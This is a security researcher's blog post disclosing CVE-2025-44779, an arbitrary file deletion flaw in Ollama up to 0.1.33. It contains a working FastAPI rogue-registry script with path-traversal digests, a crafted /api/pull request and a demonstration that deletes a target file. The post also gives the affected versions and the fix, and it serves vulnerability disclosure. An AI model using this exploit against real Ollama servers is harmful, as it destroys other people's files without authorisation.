<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CVE-2025-44779：Ollama arbitrary file deletion analysis | blog | a1batr0ss</title><meta name="keywords" content="ollama"><meta name="author" content="a1batr0ss"><meta name="copyright" content="a1batr0ss"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CVEID: CVE-2025-44779 Vulnerability type: Incorrect Access Control Affected versions: Ollama &lt;&#x3D; 0.1.33 Description:  In Ollama versions &lt;&#x3D; 0.1.33, if a file already exists at the path">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-44779：Ollama arbitrary file deletion analysis">
<meta property="og:url" content="https://a1batr0ss.top/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/index.html">
<meta property="og:site_name" content="blog | a1batr0ss">
<meta property="og:description" content="CVEID: CVE-2025-44779 Vulnerability type: Incorrect Access Control Affected versions: Ollama &lt;&#x3D; 0.1.33 Description:  In Ollama versions &lt;&#x3D; 0.1.33, if a file already exists at the path">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://a1batr0ss.top/img/gd.jpg">
<meta property="article:published_time" content="2025-08-06T01:30:27.000Z">
<meta property="article:modified_time" content="2025-08-06T06:30:35.092Z">
<meta property="article:author" content="a1batr0ss">
<meta property="article:tag" content="ollama">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://a1batr0ss.top/img/gd.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://a1batr0ss.top/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-PZYRXDQ81W"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-PZYRXDQ81W');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":50,"languages":{"author":"Author: a1batr0ss","link":"Link: ","source":"Source: blog | a1batr0ss","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2025-44779：Ollama arbitrary file deletion analysis',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2025-08-06 14:30:35'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/gd.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">blog | a1batr0ss</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2025-44779：Ollama arbitrary file deletion analysis</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-06T01:30:27.000Z" title="Created 2025-08-06 09:30:27">2025-08-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-06T06:30:35.092Z" title="Updated 2025-08-06 14:30:35">2025-08-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE/">CVE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>7min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2025-44779：Ollama arbitrary file deletion analysis"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout hide-aside" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>CVEID:</strong> CVE-2025-44779</p>
<p><strong>Vulnerability type</strong>: Incorrect Access Control</p>
<p><strong>Affected versions:</strong> Ollama &lt;&#x3D; 0.1.33</p>
<p><strong>Description:</strong>  In Ollama versions &lt;&#x3D; 0.1.33, if a file already exists at the path where a <code>digest</code> is to be saved, the file is treated as having a mismatched <code>digest</code> value and is therefore deleted.</p>
<p><strong>Author:</strong> a1batr0ss</p>
<p><strong>Remediation:</strong> Upgrade Ollama to version 0.1.34 or later</p>
<h2 id="What-is-Ollama"><a href="#What-is-Ollama" class="headerlink" title="What is Ollama?"></a>What is Ollama?</h2><p>Ollama is a lightweight, user-friendly platform designed to run and manage large language models locally on personal machines. It allows users to easily download, configure, and interact with powerful AI models like LLaMA and Mistral without needing cloud infrastructure. Ollama is particularly popular among developers and researchers who want more control over their AI workflows, data privacy, and system performance. Its streamlined interface and local-first approach make it an ideal choice for experimenting with and deploying generative AI applications in secure, offline environments.</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/1.png" alt="1"></p>
<p>Ollama’s HTTP server exposes multiple API endpoints, each performing different operations. The specific functions of these endpoints are illustrated in the diagram below.</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250317195119032.png" alt="image-20250317195119032"></p>
<p>Deploy version 0.1.33 of Ollama using Docker with a single command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name ollama -p 11434:11434 ollama/ollama:0.1.33</span><br></pre></td></tr></table></figure>

<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250806100636798.png" alt="image-20250806100636798"></p>
<h2 id="Manifest-file"><a href="#Manifest-file" class="headerlink" title="Manifest file"></a>Manifest file</h2><p>According to Ollama’s mechanism, the <code>/api/pull</code> endpoint can, by default, pull images from the official Ollama registry. However, it is also possible to pull images from a self-hosted private server. After research, it was found that by specifying the following parameters during the pull request, images can be retrieved from a private server instead.</p>
<ul>
<li><code>10.211.55.3:11434</code> is the address of the Ollama client.</li>
<li><code>192.168.200.237</code> is the address of the custom private server.</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/pull</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.211.55.3:11434</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>77</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">	<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.200.237/tianweng-anquan/a1batr0ss&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">	<span class="attr">&quot;insecure&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>Let’s first use FastAPI to set up a private server and see what happens when we send the above request package.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request, Response</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>We found that the response packet reported an error:  the manifest file was not found when pulling the image. (This is Ollama’s mechanism: when you run <code>ollama pull &lt;model&gt;</code>, the Ollama client first sends a request to the registry server to query the metadata of the model.)</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250317183351201.png" alt="image-20250317183351201"></p>
<p>The server also reported an error showing an address: <code>/v2/tianweng-anquan/a1batr0ss/manifests/latest</code>. This address must be the manifest URL requested from the registry server.</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250806102001137.png" alt="image-20250806102001137"></p>
<p>We cannot avoid discussing the manifest file here. Below is a typical manifest file:</p>
<ul>
<li><strong>config (container configuration layer):</strong> Stores metadata of the Docker container, including runtime configuration, environment variables, Entrypoint, CMD, working directory, and so on.</li>
<li><strong>layers (image layer data):</strong> Stores the filesystem layers (RootFS) of the Docker image. Each layer represents a file change, such as the result of a COPY or RUN instruction.</li>
<li><strong>digest:</strong> The original purpose of <code>digest</code> is to verify the hashes of the <code>config</code> and <code>layers</code> sections.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;schemaVersion&quot;: 2,</span><br><span class="line">  &quot;mediaType&quot;: &quot;application/vnd.docker.distribution.manifest.v2+json&quot;,</span><br><span class="line">  &quot;config&quot;: &#123;</span><br><span class="line">    &quot;mediaType&quot;: &quot;application/vnd.docker.container.image.v1+json&quot;,</span><br><span class="line">    &quot;digest&quot;: &quot;sha256:9c46aefae6c6d1e9c1c1b25b8a6f8e67a10bffbdf1b5a82842a527776b8f447a&quot;,</span><br><span class="line">    &quot;size&quot;: 7023</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;layers&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;mediaType&quot;: &quot;application/vnd.docker.image.rootfs.diff.tar.gzip&quot;,</span><br><span class="line">      &quot;digest&quot;: &quot;sha256:3a2e9a64b4e5e2b77f9a6f2bb2e9235db934e6d3a9c0b1d3837cd8b24d3f6dfb&quot;,</span><br><span class="line">      &quot;size&quot;: 2794576</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;mediaType&quot;: &quot;application/vnd.docker.image.rootfs.diff.tar.gzip&quot;,</span><br><span class="line">      &quot;digest&quot;: &quot;sha256:5b8c05cddf924c0c3e5f5a5e3f0b4a2c1b96a8a5ff8b2e99a3d5372c5f1e3a28&quot;,</span><br><span class="line">      &quot;size&quot;: 1484567</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Construct-a-malicious-server"><a href="#Construct-a-malicious-server" class="headerlink" title="Construct a malicious server"></a>Construct a malicious server</h2><p>We have discovered that before pulling an image, the Ollama client first sends a request to the malicious registry server’s <code>/v2/tianweng-anquan/a1batr0ss/manifests/latest</code> endpoint to retrieve metadata (i.e., the manifest file).</p>
<p>Through our research, we found that the Ollama client iterates over each <code>digest</code> value in the <code>layers</code> section of the metadata to request and verify them, and then attempts to save them (note that the first <code>digest</code> in the <code>layers</code> section is not saved completely).</p>
<p>Interestingly, according to Ollama’s mechanism, during the saving process of a <code>digest</code>, if a file already exists at the target path, Ollama will throw a digest mismatch error. While reporting the error, <strong>it will also delete the existing file at that path</strong>.</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250806112940904.png" alt="image-20250806112940904"></p>
<p>Based on the above principle, we can construct a malicious server accordingly.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request, Response</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/v2/tianweng-anquan/a1batr0ss/manifests/latest&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">evilManifest</span>():</span><br><span class="line">	<span class="keyword">return</span> &#123;<span class="string">&quot;schemaVersion&quot;</span>:<span class="number">2</span>,<span class="string">&quot;mediaType&quot;</span>:<span class="string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,<span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;mediaType&quot;</span>:<span class="string">&quot;application/vnd.docker.container.image.v1+json&quot;</span>,<span class="string">&quot;digest&quot;</span>:<span class="string">&quot;../../../../../../../../../../../../../etc/passwd&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">10</span>&#125;,<span class="string">&quot;layers&quot;</span>:[&#123;<span class="string">&quot;mediaType&quot;</span>:<span class="string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,<span class="string">&quot;digest&quot;</span>:<span class="string">&quot;../../../../../../../../../../../../../file/targetFile&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">10</span>&#125;]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.head(<span class="params"><span class="string">&quot;/file/targetFile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fake_notfound_head</span>(<span class="params">response: Response</span>):</span><br><span class="line">    response.headers[<span class="string">&quot;Docker-Content-Digest&quot;</span>] = <span class="string">&quot;../../../../../../../../../../../../../file/targetFile&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/file/targetFile&quot;</span>, status_code=<span class="number">206</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fake_notfound_get</span>(<span class="params">response: Response</span>):</span><br><span class="line">    response.headers[<span class="string">&quot;Docker-Content-Digest&quot;</span>] = <span class="string">&quot;../../../../../../../../../../../../../file/targetFile&quot;</span></span><br><span class="line">    response.headers[<span class="string">&quot;E-Tag&quot;</span>] = <span class="string">&quot;\&quot;../../../../../../../../../../../../../file/targetFile\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Deleted&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Proof-of-Concept-POC"><a href="#Proof-of-Concept-POC" class="headerlink" title="Proof of Concept (POC)"></a>Proof of Concept (POC)</h2><p>Create the <code>/file/targetFile</code> file on the Ollama server.</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250317135521783.png" alt="image-20250317135521783"></p>
<p>Deploy a malicious server disguised as a private registry server.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request, Response</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/v2/tianweng-anquan/a1batr0ss/manifests/latest&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">evilManifest</span>():</span><br><span class="line">	<span class="keyword">return</span> &#123;<span class="string">&quot;schemaVersion&quot;</span>:<span class="number">2</span>,<span class="string">&quot;mediaType&quot;</span>:<span class="string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,<span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;mediaType&quot;</span>:<span class="string">&quot;application/vnd.docker.container.image.v1+json&quot;</span>,<span class="string">&quot;digest&quot;</span>:<span class="string">&quot;../../../../../../../../../../../../../etc/passwd&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">10</span>&#125;,<span class="string">&quot;layers&quot;</span>:[&#123;<span class="string">&quot;mediaType&quot;</span>:<span class="string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,<span class="string">&quot;digest&quot;</span>:<span class="string">&quot;../../../../../../../../../../../../../file/targetFile&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">10</span>&#125;]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.head(<span class="params"><span class="string">&quot;/file/targetFile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fake_notfound_head</span>(<span class="params">response: Response</span>):</span><br><span class="line">    response.headers[<span class="string">&quot;Docker-Content-Digest&quot;</span>] = <span class="string">&quot;../../../../../../../../../../../../../file/targetFile&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/file/targetFile&quot;</span>, status_code=<span class="number">206</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fake_notfound_get</span>(<span class="params">response: Response</span>):</span><br><span class="line">    response.headers[<span class="string">&quot;Docker-Content-Digest&quot;</span>] = <span class="string">&quot;../../../../../../../../../../../../../file/targetFile&quot;</span></span><br><span class="line">    response.headers[<span class="string">&quot;E-Tag&quot;</span>] = <span class="string">&quot;\&quot;../../../../../../../../../../../../../file/targetFile\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Deleted&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>


<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250317134635614.png" alt="image-20250317134635614"></p>
<p>Send a crafted data packet to the <code>/api/pull</code> endpoint, where <code>10.211.55.3:11434</code> is the Ollama service address, and <code>192.168.200.237</code> is the address of the crafted malicious server.</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250806114731697.png" alt="image-20250806114731697"></p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250806115025717.png" alt="image-20250806115025717"></p>
<p>Check the <code>/file/targetFile</code> file on the Ollama server again and find that it has been deleted.</p>
<p><img src="/2025/08/06/CVE-2025-44779-Ollama-arbitrary-file-deletion/image-20250806114758487.png" alt="image-20250806114758487"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ollama/">ollama</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/06/28/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8CDN%E5%8D%87%E7%BA%A7%E4%BD%A0%E7%9A%84XSS/"><img class="next-cover" src="/img/gd.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">如何利用CDN升级你的XSS</div></div></a></div></nav></div></main><footer id="footer" style="background-image: url('/img/gd.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By a1batr0ss</div><div class="footer_custom_text">Welcome. Feel Like Home.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">简</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>